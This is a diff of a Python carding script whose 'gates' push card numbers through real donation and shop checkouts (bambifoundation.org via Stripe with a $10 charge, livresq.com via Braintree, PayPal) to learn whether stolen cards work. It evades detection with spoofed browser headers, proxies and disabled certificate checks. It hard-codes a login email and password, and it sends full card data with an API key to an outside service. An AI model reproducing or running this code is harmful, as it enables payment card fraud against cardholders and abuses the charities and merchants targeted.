@@ -8,6 +8,9 @@ import random
 import base64
 import time
 import urllib3
+import uuid
+import asyncio
+import aiohttp
 from requests_toolbelt import MultipartEncoder
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -117,7 +120,6 @@ def check_paypal_working(cc, proxy=None):
         first_name = 'DRGAM'
         last_name = 'rights and'
 
-        # Step 1: initial donation setup
         headers = {
             'origin': BASE_URL, 'referer': SITE_URL,
             'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
@@ -143,7 +145,6 @@ def check_paypal_working(cc, proxy=None):
         }
         s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)
 
-        # Step 2: create order
         mp = MultipartEncoder(fields={
             'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
             'give-form-id': (None, fi), 'give-form-title': (None, ''),
@@ -167,7 +168,6 @@ def check_paypal_working(cc, proxy=None):
         except:
             return f"Order creation failed: {r1.text[:150]}", "ERROR"
 
-        # Step 3: confirm payment source with PayPal
         pp_headers = {
             'authority': 'cors.api.paypal.com', 'accept': '*/*',
             'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
@@ -196,7 +196,6 @@ def check_paypal_working(cc, proxy=None):
         s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=pp_headers, json=json_data, timeout=30)
 
-        # Step 4: approve order
         mp2 = MultipartEncoder(fields={
             'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
             'give-form-id': (None, fi), 'give-form-title': (None, ''),
@@ -244,10 +243,6 @@ check_paypal_general = check_paypal_working
 # LOCAL STRIPE GATE (bambifoundation.org)
 # ============================================================================
 def check_stripe_api(cc, proxy=None):
-    """
-    Stripe gate using bambifoundation.org.
-    Returns (message, status).
-    """
     try:
         cc = cc.strip()
         parts = re.split(r'[ |/]', cc)
@@ -257,8 +252,6 @@ def check_stripe_api(cc, proxy=None):
         mm = parts[1]
         ex = parts[2]
         cvc = parts[3]
-
-        # Normalize year
         if len(ex) == 2:
             yy = ex
         elif len(ex) == 4:
@@ -274,18 +267,15 @@ def check_stripe_api(cc, proxy=None):
             session.proxies.update(format_proxy(proxy))
         session.verify = False
 
-        # 1. Get form data
         headers = {'user-agent': user_agent}
         resp = session.get('https://bambifoundation.org/donate-now/', headers=headers, timeout=30)
         html = resp.text
 
-        # Extract required fields
         form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
         form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
         form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
         pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html).group(1)
 
-        # 2. Initial donation setup (POST to admin-ajax)
         headers = {
             'origin': 'https://bambifoundation.org',
             'referer': 'https://bambifoundation.org/donate-now/',
@@ -342,7 +332,6 @@ def check_stripe_api(cc, proxy=None):
         }
         session.post('https://bambifoundation.org/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)
 
-        # 3. Create Stripe payment method
         stripe_headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -362,7 +351,6 @@ def check_stripe_api(cc, proxy=None):
         resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, timeout=30)
         payment_method_id = resp.json()['id']
 
-        # 4. Complete donation with Stripe payment method
         headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -427,7 +415,6 @@ def check_stripe_api(cc, proxy=None):
         resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30, allow_redirects=True)
         text = resp.text
 
-        # Parse response
         if 'Thank you' in text or 'succeeded' in text:
             return "Charged $10.00", "APPROVED"
         if 'Your card was declined.' in text:
@@ -450,247 +437,259 @@ def check_stripe_api(cc, proxy=None):
         return f"Exception: {str(e)[:100]}", "ERROR"
 
 # ============================================================================
-# LOCAL BRAINTREE GATE (shop.trifectanutrition.com)
+# B3 AUTH GATE (livresq.com)
 # ============================================================================
-def check_braintree(cc, proxy=None):
-    """
-    Braintree tokenization gate using shop.trifectanutrition.com.
-    Returns (message, status).
-    """
+EMAIL = "joykrissa+zmqtr@gmail.com"
+PASSWORD = "Nova@6999"
+
+def h1():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'cache-control': 'no-cache',
+        'upgrade-insecure-requests': '1',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-user': '?1',
+        'sec-fetch-dest': 'document',
+        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'referer': 'https://livresq.com/en/my-account/',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+    }
+
+def h2():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'cache-control': 'no-cache',
+        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'origin': 'https://livresq.com',
+        'upgrade-insecure-requests': '1',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-user': '?1',
+        'sec-fetch-dest': 'document',
+        'referer': 'https://livresq.com/en/my-account/',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+    }
+
+def h3():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'upgrade-insecure-requests': '1',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-user': '?1',
+        'sec-fetch-dest': 'document',
+        'referer': 'https://livresq.com/en/my-account/payment-methods/',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+    }
+
+def h4():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'cache-control': 'no-cache',
+        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'origin': 'https://livresq.com',
+        'upgrade-insecure-requests': '1',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-user': '?1',
+        'sec-fetch-dest': 'document',
+        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+    }
+
+def ajax_h():
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
+        'Accept': '*/*',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'origin': 'https://livresq.com',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-dest': 'empty',
+        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=1, i',
+    }
+
+def bt_h(fp):
+    return {
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
+        'Content-Type': 'application/json',
+        'Authorization': f'Bearer {fp}',
+        'Braintree-Version': '2018-05-10',
+        'Origin': 'https://assets.braintreegateway.com',
+        'Sec-Fetch-Site': 'cross-site',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Dest': 'empty',
+        'Referer': 'https://assets.braintreegateway.com/',
+        'Accept-Language': 'en-US,en;q=0.9',
+    }
+
+def check_b3_auth(cc, proxy=None):
     try:
         cc = cc.strip()
-        parts = re.split(r'[ |/]', cc)
-        if len(parts) < 4:
+        parts = cc.split('|')
+        if len(parts) != 4:
             return "Invalid format", "ERROR"
-        c = parts[0]
+        cc_num = parts[0]
         mm = parts[1]
-        ex = parts[2]
-        cvc = parts[3]
-        if len(ex) == 2:
-            yy = ex
-        elif len(ex) == 4:
-            yy = ex[2:]
-        else:
-            yy = ex
-        if len(yy) == 4:
-            yy = yy[2:]
-        if len(yy) != 2:
-            yy = yy[-2:]
+        yy = parts[2]
+        cvv = parts[3]
+        if len(yy) == 2:
+            yy = '20' + yy
+        yy = yy[-2:]
 
-        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
-        email = f"{username}@gmail.com"
-        user_agent = generate_user_agent()
-
-        session = requests.Session()
+        s = requests.Session()
         if proxy:
-            session.proxies.update(format_proxy(proxy))
-        session.verify = False
+            s.proxies.update(format_proxy(proxy))
+        s.verify = False
 
-        # 1. Create account
-        headers = {'User-Agent': user_agent}
-        json_data = {'email': email, 'password': email}
-        session.post('https://shop.trifectanutrition.com/wp-json/tf/v1/fb/user/create/email',
-                     headers=headers, json=json_data, timeout=30)
-
-        # 2. Get address nonce – using multiple patterns
-        resp = session.get('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
-                           headers=headers, timeout=30)
-        html = resp.text
-        address_nonce = None
-        patterns = [
-            r'name="woocommerce-edit-address-nonce" value="(.*?)"',
-            r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"',
-            r'woocommerce-edit-address-nonce" value="([^"]+)"',
-        ]
-        for pat in patterns:
-            match = re.search(pat, html)
-            if match:
-                address_nonce = match.group(1)
-                break
-        if not address_nonce:
-            return "Failed to get address nonce", "ERROR"
-
-        # 3. Set billing address
-        data = {
-            'billing_first_name': 'Hussein',
-            'billing_last_name': 'Alfuraijii',
-            'billing_company': '',
-            'billing_country': 'CA',
-            'billing_address_1': '3480 Granada Ave',
-            'billing_city': 'Los Angeles',
-            'billing_state': 'AB',
-            'billing_postcode': 'T7S 1E8',
-            'billing_phone': '3153153152',
-            'billing_email': email,
-            'save_address': 'Save address',
-            'woocommerce-edit-address-nonce': address_nonce,
-            '_wp_http_referer': '/my-account/edit-address/billing/',
-            'action': 'edit_address',
+        r = s.get('https://livresq.com/en/my-account/', headers=h1())
+        n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
+        if not n:
+            return "Login nonce failed", "ERROR"
+        d = {
+            'username': EMAIL,
+            'password': PASSWORD,
+            'woocommerce-login-nonce': n.group(1),
+            '_wp_http_referer': '/en/contul-meu/',
+            'login': 'Log in',
+            'trp-form-language': 'en'
         }
-        session.post('https://shop.trifectanutrition.com/my-account/edit-address/billing/',
-                     headers=headers, data=data, timeout=30)
+        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
+        if 'woocommerce-error' in r.text or not ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
+            return "Login failed", "ERROR"
 
-        # 4. Get payment page nonces
-        resp = session.get('https://shop.trifectanutrition.com/my-account/add-payment-method/',
-                           headers=headers, timeout=30)
-        html = resp.text
-        payment_nonce = None
-        for pat in patterns:
-            match = re.search(pat.replace('edit-address', 'add-payment-method'), html)
-            if match:
-                payment_nonce = match.group(1)
-                break
-        if not payment_nonce:
-            match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', html)
-            if match:
-                payment_nonce = match.group(1)
-        if not payment_nonce:
-            return "Failed to get payment nonce", "ERROR"
+        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
+        an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
+        cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
+        if not cn:
+            cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
+        if not an or not cn:
+            return "Failed to get nonces", "ERROR"
+        an_val = an.group(1)
+        cn_val = cn.group(1)
 
-        client_token_nonce = None
-        match = re.search(r'client_token_nonce":"([^"]+)"', html)
-        if match:
-            client_token_nonce = match.group(1)
-        if not client_token_nonce:
-            match = re.search(r'client_token_nonce["\']:\s*["\']([^"\']+)["\']', html)
-            if match:
-                client_token_nonce = match.group(1)
-        if not client_token_nonce:
-            return "Failed to get client token nonce", "ERROR"
+        d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn_val}
+        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
+        if r.status_code != 200:
+            return "Failed to get client token", "ERROR"
+        j = r.json()
+        dt = base64.b64decode(j['data']).decode('utf-8')
+        fp = json.loads(dt).get('authorizationFingerprint')
+        if not fp:
+            return "Failed to get fingerprint", "ERROR"
 
-        # 5. Get Braintree client token
-        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_token_nonce}
-        resp = session.post('https://shop.trifectanutrition.com/wordpress/wp-admin/admin-ajax.php',
-                            headers=headers, data=data, timeout=30)
-        enc = resp.json()['data']
-        dec = base64.b64decode(enc).decode('utf-8')
-        auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
-
-        # 6. Tokenize card
-        braintree_headers = {
-            'authority': 'payments.braintree-api.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-            'accept-language': 'en-US,en;q=0.9',
-            'authorization': f'Bearer {auth_fingerprint}',
-            'braintree-version': '2018-05-10',
-            'content-type': 'application/json',
-            'origin': 'https://assets.braintreegateway.com',
-            'referer': 'https://assets.braintreegateway.com/',
-            'user-agent': user_agent,
-        }
-        json_data = {
-            'clientSdkMetadata': {
-                'source': 'client',
-                'integration': 'custom',
-                'sessionId': 'ae0e96cd-7aa2-418c-8fba-6627701d117c',
-            },
-            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
+        sid = str(uuid.uuid4())
+        q = {
+            'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
+            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+                tokenizeCreditCard(input: $input) {
+                    token
+                }
+            }''',
             'variables': {
                 'input': {
-                    'creditCard': {
-                        'number': c,
-                        'expirationMonth': mm,
-                        'expirationYear': yy,
-                        'cvv': cvc,
-                    },
-                    'options': {'validate': False},
-                },
+                    'creditCard': {'number':cc_num,'expirationMonth':mm,'expirationYear':yy,'cvv':cvv},
+                    'options': {'validate': False}
+                }
             },
-            'operationName': 'TokenizeCreditCard',
+            'operationName': 'TokenizeCreditCard'
         }
-        resp = session.post('https://payments.braintree-api.com/graphql',
-                            headers=braintree_headers, json=json_data, timeout=30)
-        token = resp.json()['data']['tokenizeCreditCard']['token']
+        resp = s.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q)
+        if resp.status_code != 200:
+            return "Tokenization failed", "ERROR"
+        res = resp.json()
+        token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
+        if not token:
+            return "Token not received", "ERROR"
 
-        # 7. Add payment method
-        data = {
-            'payment_method': 'braintree_credit_card',
-            'wc-braintree-credit-card-card-type': 'master-card',
-            'wc-braintree-credit-card-3d-secure-enabled': '',
-            'wc-braintree-credit-card-3d-secure-verified': '',
-            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-            'wc_braintree_credit_card_payment_nonce': token,
-            'wc_braintree_device_data': '',
-            'wc-braintree-credit-card-tokenize-payment-method': 'true',
-            'woocommerce-add-payment-method-nonce': payment_nonce,
-            '_wp_http_referer': '/my-account/add-payment-method/',
-            'woocommerce_add_payment_method': '1',
-        }
-        resp = session.post('https://shop.trifectanutrition.com/my-account/add-payment-method/',
-                            headers=headers, data=data, timeout=30)
-        text = resp.text
-
-        if 'added' in text or 'Payment method successfully added.' in text:
-            return "Approved ✅", "APPROVED"
-        elif 'Duplicate card exists' in text:
-            return "Approved ✅ (Duplicate)", "APPROVED"
-        elif 'risk_threshold' in text:
-            return "RISK: Retry this BIN later.", "DECLINED"
-        elif 'Card Issuer Declined CVV' in text:
-            return "Declined CVV", "DECLINED"
-        elif 'avs' in text or 'cvv' in text:
-            return "AVS/CVV Failure", "DECLINED"
-        else:
-            match = re.search(r'Reason: (.+?)\s*</li>', text)
-            if match:
-                reason = match.group(1)
-                return f"Declined: {reason}", "DECLINED"
-            return "Unknown error", "ERROR"
+        for _ in range(4):
+            pd = {
+                'payment_method': 'braintree_credit_card',
+                'wc-braintree-credit-card-card-type': 'visa',
+                'wc-braintree-credit-card-3d-secure-enabled': '',
+                'wc-braintree-credit-card-3d-secure-verified': '',
+                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+                'wc_braintree_credit_card_payment_nonce': token,
+                'wc_braintree_device_data': '',
+                'wc-braintree-credit-card-tokenize-payment-method': 'true',
+                'woocommerce-add-payment-method-nonce': an_val,
+                '_wp_http_referer': '/en/contul-meu/add-payment-method/',
+                'woocommerce_add_payment_method': '1',
+                'trp-form-language': 'en'
+            }
+            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
+            if 'You cannot add a new payment method so soon' in r.text:
+                time.sleep(15)
+                continue
+            em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
+            if em:
+                et = re.sub(r'\s+', ' ', em.group(1).strip())
+                et = re.sub(r'&nbsp;', ' ', et)
+                return et, "DECLINED"
+            if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
+                return "APPROVED - Card Added", "APPROVED"
+            sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
+            if sm:
+                st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
+                st = re.sub(r'\s+', ' ', st)
+                return st, "APPROVED"
+            time.sleep(15)
+        return "Unknown response", "ERROR"
 
     except Exception as e:
         return f"Exception: {str(e)[:100]}", "ERROR"
 
 # ============================================================================
-# GENERIC GATEWAY API (all gates share the same base URL and key)
-# No "Onyx" naming, errors hide the endpoint, timeout = 120 seconds
+# GATEWAY API (external service)
 # ============================================================================
 GATEWAY_API_BASE = "https://onyxenvbot.up.railway.app"
 API_KEY = "yashikaaa"
 
 def _check_gateway_api(cc, gateway_path, gateway_name):
-    """
-    Internal helper for all API-based gates.
-    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
-    """
     try:
         cc = cc.strip()
         parts = cc.split('|')
         if len(parts) < 4:
             return "Invalid format", "ERROR"
-        cc_encoded = cc  # the API expects the whole cc string with '|' separators
-        # URL-encode the whole CC string to avoid issues with '|'
         import urllib.parse
-        cc_encoded = urllib.parse.quote(cc_encoded)
+        cc_encoded = urllib.parse.quote(cc)
         url = f"{GATEWAY_API_BASE}/{gateway_path}/key={API_KEY}/cc={cc_encoded}"
-
-        session = requests.Session()
-        # No proxy support in this helper because the external API is not meant to be proxied
-        response = session.get(url, timeout=120, verify=False)
+        response = requests.get(url, timeout=120, verify=False)
         response.raise_for_status()
         data = response.json()
-
         result_status = data.get('status', '').lower()
         response_msg = data.get('response', '')
-
         if result_status == 'approved':
             return response_msg, "APPROVED"
         else:
-            # Return the decline reason but without any URL or internal details
             return response_msg if response_msg else "Declined", "DECLINED"
-
-    except requests.exceptions.Timeout:
-        return "Gateway timeout", "ERROR"
-    except requests.exceptions.RequestException:
-        # Generic error – no URL or details exposed
-        return "Gateway error", "ERROR"
-    except json.JSONDecodeError:
-        return "Invalid response", "ERROR"
     except Exception:
         return "Gateway error", "ERROR"
 
-# ============================================================================
-# API-BASED GATES (replacing the old dummy functions)
-# ============================================================================
 def check_chaos(cc, proxy=None):
     return _check_gateway_api(cc, "chaos", "Chaos Auth")
 
@@ -733,9 +732,5 @@ def check_sk_gateway(cc, proxy=None):
 def check_paypal_onyx(cc, proxy=None):
     return _check_gateway_api(cc, "paypal", "PayPal")
 
-# ============================================================================
-# Additional API gate for Braintree (local version already exists as check_braintree)
-# This is provided for completeness, but the local version is kept unchanged.
-# ============================================================================
 def check_braintree_api(cc, proxy=None):
     return _check_gateway_api(cc, "braintree", "Braintree API")
